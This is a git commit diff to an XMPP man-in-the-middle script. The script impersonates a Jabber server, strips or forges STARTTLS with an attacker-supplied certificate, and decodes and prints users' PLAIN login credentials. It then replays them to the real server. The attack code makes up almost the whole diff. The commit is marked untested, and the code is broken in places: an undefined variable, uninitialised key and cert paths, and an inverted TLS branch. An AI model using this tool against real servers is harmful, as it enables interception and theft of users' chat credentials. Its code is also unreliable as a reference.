91ab2fa7a20e2e14fab540e6d761b284ef3614a2
ultramegaman <github@ultramegaman.com>
2012-10-01 20:19:35 -0600

    initial attempt at client-side ssl, untested

--- xmppmitm.py
+++ xmppmitm.py
@@ -21,6 +21,8 @@ The Plan:
 # Used to impersonate server
 packet0 = '''<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='1234567890' from='%s' version='1.0' xml:lang='en'>'''
 packet1 = '''<stream:features><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><mechanism>PLAIN</mechanism></mechanisms><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='ZGVhZGJlZWZkZWFkYmVlZg=='/></stream:features>'''
+packet1tls = '''<stream:features><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><mechanism>PLAIN</mechanism></mechanisms><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='ZGVhZGJlZWZkZWFkYmVlZg=='/></stream:features>'''
+packet2 = '''<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>'''
 # Used to impersonate client
 packetA = '''<?xml version='1.0'?>'''
 packetB = '''<stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0' to='%s'>'''
@@ -54,6 +56,7 @@ def dotarget(clientsock,target,name,credblob):
 		
 		# Receive STARTTLS==OK
 		pkt = targetsock.recv(BUFSIZE)
+		print pkt
 		if 'proceed' not in pkt:
 			print pkt
 			raise Exception("Didn't receive STARTTLS <proceed>")
@@ -116,41 +119,84 @@ def dotarget(clientsock,target,name,credblob):
 		print "closing SSL socket:", e
 		sslsock.close()
 
-def child(sock,target):
+def child(sock,target,certfile='',keyfile=''):
 	try:
 		# Receive XML Header
-		req0 = sock.recv(BUFSIZE)
+		pkt = sock.recv(BUFSIZE)
 		
 		# Receive Server Name
-		req1 = sock.recv(BUFSIZE)
+		pkt = sock.recv(BUFSIZE)
 		m = re.search("to='([\w\.]+)'",req1)
 		name = m.group(1)
 		print 'hostname:', name
 		
 		# Send Name==OK
 		sock.send(packet0 % name)
-		
-		# Send Features: no TLS & PLAIN auth
-		sock.send(packet1)
-		
-		# Receive PLAIN auth
-		authblock = sock.recv(BUFSIZE)
-		if authblock != '':
-			credblob = re.search('>(\w+)</auth>',authblock).group(1)
-			creds = base64.b64decode(credblob).split('\x00')
-			print "credentials:",creds
-			dotarget(sock,target,name,credblob)
+
+		if certfile != '' and keyfile != '':
+			# Send Features: no TLS & PLAIN auth
+			sock.send(packet1)
+			
+			# Receive PLAIN auth
+			authblock = sock.recv(BUFSIZE)
+			if authblock != '':
+				credblob = re.search('>(\w+)</auth>',authblock).group(1)
+				creds = base64.b64decode(credblob).split('\x00')
+				print "credentials:",creds
+				dotarget(sock,target,name,credblob)
+			else:
+				print "Client doesn't like PLAIN && ! TLS"
+			sock.close()
 		else:
-			print "Client doesn't like PLAIN or non-TLS"
-		sock.close()
+			# Send Features: TLS & PLAIN auth
+			sock.send(packet1tls)
+			
+			# Receive STARTTLS
+			pkt = sock.recv(BUFSIZE)
+			if pkt == '':
+				raise Exception("Didn't receive STARTTLS")
+			
+			# Send STARTTLS==OK
+			sock.send(packet2)
+			
+			sslsock = ssl.wrap_socket(sock,server_side=True,suppress_ragged_eofs=False,certfile=certfile,keyfile=keyfile)
+			try:
+				# Receive XML Header
+				pkt = sslsock.recv(BUFSIZE)
+				
+				# Receive Server Name
+				pkt = sslsock.recv(BUFSIZE)
+
+				# Send Name==OK
+				sslsock.send(packet0 % name)				
+
+				# Send Features: no TLS & PLAIN auth
+				sslsock.send(packet1)
+				
+				# Receive PLAIN auth
+				authblock = sslsock.recv(BUFSIZE)
+				if authblock != '':
+					credblob = re.search('>(\w+)</auth>',authblock).group(1)
+					creds = base64.b64decode(credblob).split('\x00')
+					print "credentials:",creds
+					dotarget(sslsock,target,name,credblob)
+				else:
+					print "Client doesn't like PLAIN or our TLS certificate"
+				sslsock.close()
+			except Exception as e:
+				sslsock.close()
+				return
 	except Exception as e:
 		print "closing client socket:",e
 		sock.close()
 
 if __name__=='__main__': 
-	if len(sys.argv) != 2:
+	if len(sys.argv) < 2:
 		sys.exit('Usage: %s TARGETHOST\nExample: %s jabber.yourcompany.org' % sys.argv[0], sys.argv[0])
 	target = sys.argv[1]
+	if len(sys.argv) == 4:
+		keyfile = sys.argv[2]
+		certfile = sys.argv[3]
 	myserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	myserver.bind((HOST, PORT))
 	myserver.listen(2)
@@ -159,6 +205,9 @@ if __name__=='__main__':
 		while 1:
 			client, addr = myserver.accept()
 			print 'CLIENT CONNECT from:', addr
-			thread.start_new_thread(child, (client,target))
+			if keyfile == '' or certfile == '':
+				thread.start_new_thread(child, (client,target))
+			else:
+				thread.start_new_thread(child, (client,target,certfile,keyfile))
 	except KeyboardInterrupt:
 		server.close()
